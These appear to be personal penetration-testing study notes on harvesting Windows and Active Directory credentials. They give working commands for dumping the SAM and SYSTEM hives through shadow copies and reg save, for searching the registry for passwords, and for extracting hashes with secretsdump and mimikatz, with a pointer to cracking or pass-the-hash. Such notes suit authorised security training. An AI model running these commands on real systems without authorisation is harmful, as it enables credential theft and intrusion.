# Active Directory Credentials Harvesting


## Common Credentials Locations

### Clear-Text Files

Some places to look around include:
- Command history
    - Powershell: `C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- Config files 
- Other files related to Windows Applications, such as Internet Browsers, Email Clients etc.
- Backup files
- Shared files/folders/repositories
- Registry
    - `reg query HKLM /f password /t REG_SZ /s` - `/f` SearchString; `/t` Type; `/s` Recursive (searches subkeys too)
    - Can replace `HKLM` with `HKCU` instead for current user key info
- Source code

### Other Locations

Other locations include:
- Database files
- Password managers
- Memory
- Active Directory
    - Users' description
    - Group Policy SYSVOL
    - NTDS (NT Directory Services - contains AD data)
    - AD Attacks e.g. Kerberoasting


## Local Windows Harvesting

### Keystrokes

Self-explanatory. Not really a penetesting thing, but more a red-teaming thing.

### SAM - Security Account Manager

- Database containing local account information, including usernames + passwords
- `C:\Windows\System32\config\sam`
- Encrypted storage and cannot be accessed by any user while the Windows OS is running
- Decryption keys are stored in the `system` file - `C:\Windows\System32\config\system`
- ...but it *can* still be accessed:

**Metasploit | HashDump**

**Microsoft Volume shadow copy service**

This service is used to make backups of files or entire drives. By doing this we can dump SAM:
1. Run `cmd.exe` prompt **as administrator** (important !)
2. Create shadow copy of `C:\` drive using `wmic`
3. Verify successful creation
4. Copy SAM database from shadow copy of volume to attacking machine for hash extraction.

In terms of commands, this is what we run:
```
wmic shadowcopy call create Volume='C:\'

vssadmin list shadows

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\Users\<username>\Desktop\sam-shadow-copy

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\Users\<username>\Desktop\system-shadow-copy
```

**Registry Hives**

Can dump SAM database content via Windows Registry using `reg.exe`:
```
reg save HKLM\SAM C:\Users\<username>\Desktop\sam-reg
reg save HKLM\SYSTEM C:\Users\<username>\Desktop\system-reg
```
Then SCP files back to attacking machine for extracting.

**Extracting Hashes**

Can use Impacket SecretsDump script (https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) with SAM and SYSTEM files passed as parameters to decrypt secrets:

```
python3.9 impacket/examples/secretsdump.py -sam /path/to/sam -system /path/to/system LOCAL
```

This will only yield NTLM hashes for local account access. For Active Directory NTLM hashes (which Metasploit HashDump gives), an additional hive is needed: `HKLM\Security` - this file also includes Kerberos keys, domain-cached credentials and security questions

Alternatively can use mimikatz `sekurlsa` module:

```
privilege::debug
sekurlsa::logonPasswords
```

Can then either HashCat these bitches for plaintext creds or exploit via other means e.g. Pass-the-Hash attacks


